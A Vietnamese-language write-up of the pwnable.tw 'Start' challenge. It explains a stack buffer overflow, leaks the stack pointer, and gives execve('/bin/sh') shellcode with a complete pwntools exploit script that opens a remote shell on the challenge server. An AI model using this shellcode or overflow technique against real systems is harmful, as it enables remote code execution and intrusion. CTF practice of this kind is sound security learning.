# Start - pwnable.tw
## Challenge

<p align="center">
  <img src="https://user-images.githubusercontent.com/64201705/138208384-1665452f-2327-4edc-a780-b3f2a8938387.png">
</p>

### File
<p align="center">
  <img src="https://user-images.githubusercontent.com/64201705/138210568-1c2f54c4-72d1-4192-ad45-9e8699325d50.png">
</p>

### Checksec
<p align="center">
  <img src="https://user-images.githubusercontent.com/64201705/138210943-fd316314-5f7c-4ce3-8d89-ef94e4917aa6.png">
</p>

### Run
<p align="center">
  <img src="https://user-images.githubusercontent.com/64201705/138211025-40281b14-c94f-462a-96cb-4951d2e5a82f.png">
</p>

### Disassemble
<p align="center">
  <img src="https://user-images.githubusercontent.com/64201705/138210873-5415e47e-b060-4ab5-b029-6f4657dd8cb6.png">
</p>

### Phân tích
Luồng thực thi của chương trình:
- Push esp: đẩy giá trị esp vào stack
- Push ```0x804809d```: đẩy địa chỉ đang trỏ tới hàm thoát vào stack để kết thúc chương trình khi gọi return (Khi phân tích bằng IDA hoặc X96DBG sẽ thấy rõ hơn)
- Khởi tạo giá trị cho các thanh ghi (```xor eax, eax``` nghĩa là ```eax = 0```, tương tự với các thanh ghi ```ebx, ecx, edx```)
- Thực hiện ```5``` lệnh push để đưa dòng chữ ```Let's start the CTF``` vào stack.
- Chương trình dùng ```0x80``` để gọi các lệnh hệ thống (Linux Syscall)
- Giá trị ```0x80``` đầu tiên, ```eax = 4```, chương trình gọi lệnh ```sys_write()``` để in ra stdout (```ebx = 1```) ```20``` kí tự (```edx = 0x14```) tại địa chỉ esp (```ecx = esp```), mục đích là in dòng ```Let's start the CTF``` ra màn hình.
- Giá trị ```0x80``` thứ hai, ```eax = 3```, chương trình gọi lệnh ```sys_read()``` đọc tối đa 60 ký tự (```edx = 0x3c```) từ stdin (```ebx = 0```), lưu vào stack tại vị trí esp (```ecx = esp```).
- Tăng giá trị ```esp``` lên 20 và return.

Ta thấy chương trình cho phép nhập vào 60 kí tự vào stack, trong khi chỉ tăng ```esp``` lên 20 và return. Do đó BOF xảy ra.
Ta sẽ ghi đề stack cho gần tới giá trị return, ta sẽ thay vào đó là địa chỉ chứa shellcode mà ta inject vào. Nó sẽ thực thi shellcode và ta sẽ lấy được shell.

Shell code lấy trên mạng:
```python
shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

```
Một vấn đề đặt ra là làm sao ta biết địa chỉ bắt đầu của đoạn shellcode sau khi ta đưa nó vào stack?
Để giải quyết vấn đề này, ta để ý ở đầu phương trình, có lệnh ```push esp``` để đẩy giá trị esp vào đầu stack, vậy nếu ta gửi:

```python
payload = 'A'*0x14 + '\x87\x80\x04\x08'
```

chương trình sau khi return, nó sẽ trở về địa chỉ ```0x08048087``` để chạy tiếp ```sys_write()```, in ra 20 bytes tiếp đó. Vì 4 bytes đầu tiên là của ```push esp``` tức giá trị esp nên ta sẽ biết giá trị esp. Chương trình sẽ tiếp tục chạy lệnh ```sys_read()```, đây là cơ hội để ta chèn tiếp payload có chứa shellcode vào:

```python
payload = 'A'*0x14 + (esp + 20) + shellcode
```

Như vậy chương trình sẽ chạy tiếp và return về đúng địa chỉ shellcode của chúng ta.

### Full payload
```python
from pwn import *

def leak_esp(r):
        address_1 = p32(0x08048087)             # mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80; 
        payload = 'A'*20 + address_1
        print r.recvuntil('CTF:')
        r.send(payload)
        esp = u32(r.recv()[:4])
        print "Address of ESP: ", hex(esp)
        return esp

shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

if __name__ == "__main__":
    context.arch = 'i386'
    r = remote('chall.pwnable.tw', 10000)
    #gdb.attach(r)
    esp = leak_esp(r)
    payload = "A"*20  + p32(esp + 20) + shellcode 
    r.send(payload)
    r.interactive() 
```

### Get flag

<p align="center">
  <img src="https://user-images.githubusercontent.com/64201705/138227276-d8a8c46f-a56a-4157-b36a-476cf828b4f7.png">
</p>

<p align="center">
  <img src="https://user-images.githubusercontent.com/64201705/138227313-817d448a-d72c-4171-85e9-add4b7c0aead.png">
</p>

